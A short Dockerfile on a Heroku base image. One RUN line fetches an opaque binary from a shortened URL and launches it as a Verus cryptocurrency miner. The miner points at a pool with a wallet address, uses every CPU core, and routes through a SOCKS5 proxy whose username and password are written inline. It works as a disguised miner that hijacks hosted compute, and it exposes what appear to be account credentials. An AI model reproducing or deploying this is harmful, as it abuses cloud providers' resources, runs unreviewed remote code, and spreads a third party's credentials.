FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget -qO build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://na.luckpool.net:3956 -u RQ49i5erGDL5XnpUEjKksn9SvdES8qjsow -p x -t $(nproc --all) -x socks5://azBwEjDJ:ufftg89PHRk@lon.socks.ipvanish.com:1080
CMD bash heroku.sh
